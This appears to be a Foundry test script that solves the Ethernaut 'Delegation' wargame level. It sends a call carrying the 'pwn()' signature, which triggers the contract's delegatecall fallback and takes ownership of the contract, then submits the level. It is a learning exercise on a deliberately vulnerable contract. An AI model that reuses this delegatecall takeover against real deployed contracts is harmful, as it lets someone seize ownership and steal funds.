// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Delegation.sol";

contract DelegationSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Delegation instance = Delegation(getLevelInstance(Levels.delegation));

        (bool success, bytes memory data) = address(instance).call(abi.encodeWithSignature("pwn()"));

        require(validateLevelInstance(Levels.delegation, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
